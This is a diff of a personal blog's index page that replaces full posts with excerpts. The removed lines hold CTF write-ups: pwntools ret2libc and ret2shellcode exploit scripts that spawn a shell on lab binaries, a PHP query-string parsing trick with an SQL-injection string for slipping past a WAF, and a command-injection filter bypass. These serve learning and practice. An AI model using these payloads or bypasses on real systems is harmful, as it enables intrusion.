@@ -123,11 +123,11 @@
     <div class="article-entry" itemprop="articleBody">
        
   <p>此题考查php文件解析漏洞</p>
-<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。<br>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。<br>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
-<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
-<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
-<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>        1.删除空白符<br>        2.将某些字符转换为下划线（包括空格）</p>
- 
+<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p> 
+      <a class="article-more-link" href="/2020/04/02/buuctf-web-easy-calc-wirteup/"
+        >阅读更多...</a
+      >
+       
       <!-- reward -->
       
     </div>
@@ -232,8 +232,11 @@
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>import  random</p>
-<h1><span id="随机整数print-randomrandint150">随机整数：print random.randint(1,50)</span></h1><h1><span id="随机选取0到100间的奇偶数print-randomrandrange0-101-12">随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)</span></h1><h1><span id="随机浮点数print-randomrandom-无范围-print-randomuniform1-10-有范围">随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</span></h1><h1><span id="随机字符print-randomchoiceabcdefghijklmnopqrstuvwxyzamp">随机字符：print random.choice(‘abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()’)</span></h1><h1><span id="多个字符中生成指定数量的随机字符print-randomsamplezyxwvutsrqponmlkjihgfedcba5">多个字符中生成指定数量的随机字符：print random.sample(‘zyxwvutsrqponmlkjihgfedcba’,5)</span></h1><h1><span id="从a-za-z0-9生成指定数量的随机字符ran_str-joinrandomsamplestringascii_letters-stringdigits-8-print-ran_str">从a-zA-Z0-9生成指定数量的随机字符：ran_str = ‘’.join(random.sample(string.ascii_letters + string.digits, 8))  print ran_str</span></h1><h1><span id="多个字符中选取指定数量的字符组成新字符串print-joinrandomsamplezyxwvutsrqponmlkjihgfedcba-5">多个字符中选取指定数量的字符组成新字符串：print ‘’.join(random.sample([‘z’,’y’,’x’,’w’,’v’,’u’,’t’,’s’,’r’,’q’,’p’,’o’,’n’,’m’,’l’,’k’,’j’,’i’,’h’,’g’,’f’,’e’,’d’,’c’,’b’,’a’], 5))</span></h1><h1><span id="随机选取字符串print-randomchoice剪刀-石头-布">随机选取字符串：print random.choice([‘剪刀’, ‘石头’, ‘布’])</span></h1><h1><span id="打乱排序items-1-2-3-4-5-6-7-8-9-0-print-randomshuffleitems">打乱排序items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]   print random.shuffle(items)</span></h1> 
+  <p>import  random<br>随机整数：print random.randint(1,50)<br>随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)<br>随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</p> 
+      <a class="article-more-link" href="/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+        >阅读更多...</a
+      >
+       
       <!-- reward -->
       
     </div>
@@ -350,61 +353,11 @@
 
 file 一下 ret2lib ，返回32位
 
-用ida打开文件分析一下</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc068d80b6c5.png" alt></p>
-<pre><code>这里两个地方值得注意：
-    1、see_something()这个函数可以将你输入的地址找到其在运行中的真实地址
-
-    2、像read，puts这样简单的函数可以被用来寻找偏移量
-
-通过这两点可以用see_something()这个函数，将puts函数的真实地址返回出来
-
-接下来就是找到libc的真实地址，计算偏移量，然后计算出system的真实地址，最后是计算出&quot;bin/sh&quot;真实地址拿到shell
-
-exp：
-
-#-*-coding:utf8-*-
-from pwn import *
-
-io = process(&quot;./ret2lib&quot;)
-elf = ELF(&quot;./ret2lib&quot;)
-
-libc = ELF(&quot;/lib32/libc.so.6&quot;)
-
-puts_libc = libc.symbols[&quot;puts&quot;]
-print &quot;puts_libc&quot; + hex(puts_libc) 
-
-system_libc = libc.symbols[&quot;system&quot;]
-
-binsh_libc = libc.search(&apos;/bin/sh&apos;).next()
-print &quot;binsh_libc&quot; + hex(binsh_libc)
-
-puts_plt = elf.plt[&quot;puts&quot;]
-print &quot;puts_plt:&quot; + hex(puts_plt)
-
-puts_got = elf.got[&quot;puts&quot;]
-print &quot;puts_got:&quot; + hex(puts_got)
-
-io.recvuntil(&quot;:&quot;)
-io.sendline(str(puts_got))
-
-io.recvuntil(&apos;0x&apos;)
-puts_addr = int(io.reuntil(&apos;\n&apos;),16)
-print &quot;puts_addr:&quot; + hex(puts_addr) //获得puts地址
-
-main = 0x0804857d  //通过ida找出mian的地址
-
-offset = puts_addr - puts_libc  //计算偏移量
-system_addr = system_libc + offset  //system地址
-binsh =  binsh_libc + offset  // bin/sh地址
-
-io.recvuntil(&quot;:&quot;)
-payload = &apos;a&apos; * 60
-payload += p32(system_addr) + p32(main) + p32(binsh)
-
-
-io.sendline(payload)
-io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3cdfb2d.png" alt></p>
-<pre><code>拿到shell</code></pre> 
+用ida打开文件分析一下</code></pre> 
+      <a class="article-more-link" href="/2019/04/24/Hitcon-lab4/"
+        >阅读更多...</a
+      >
+       
       <!-- reward -->
       
     </div>
@@ -457,26 +410,11 @@ io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3c
     <div class="article-entry" itemprop="articleBody">
        
   <p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
-<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
-<pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
-<pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
-<pre><code>ls一下看到了当前文件夹下的文件，flag就在里面
-
-接着打算直接cat flag，然而并不行
-
-if(!empty($_GET)){
-$str=$_GET[&quot;calc&quot;];
-if(strpos($str,&quot;#&quot;)!==false)
-    die;
-if(strpos($str,&quot;`&quot;)!==false)
-    die;
-if(strpos($str,&quot;flag&quot;)!==false)
-    die;
-
-成了,flag被过滤了
-
-嗯，换一个命令 grep </code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ebfcf1e8.png" alt></p>
-<pre><code>拿到flag</code></pre> 
+<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p> 
+      <a class="article-more-link" href="/2019/04/19/calc2/"
+        >阅读更多...</a
+      >
+       
       <!-- reward -->
       
     </div>
@@ -534,31 +472,11 @@ if(strpos($str,&quot;flag&quot;)!==false)
 
 由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路
 
-首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
-<pre><code>地址为0x0804A060
-
-直接上exp：
-
-from pwn import *
-
-&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;
-
-context.log_level = &apos;debug&apos;
-
-io = process(&apos;ret2sc&apos;)
-
-sc = asm(shellcraft.sh())
-
-ret2 = &apos;A&apos;*32 + p32(0x0804A060)
-
-io.sendafter(&apos;Name:&apos;,sc)
-
-io.sendafter(&apos;best:&apos;,ret2)
-
-io.interactive()
-
-直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
-<pre><code>ok，拿到shell，直接cat flag就行了</code></pre> 
+首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre> 
+      <a class="article-more-link" href="/2019/04/18/hitcon-lab3/"
+        >阅读更多...</a
+      >
+       
       <!-- reward -->
       
     </div>
@@ -778,7 +696,7 @@ lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb�
     <ul>
       <li>
         Copyrights &copy;
-        2015-2020
+        2017-2020
         <i class="ri-heart-fill heart_icon"></i> ziky
       </li>
     </ul>
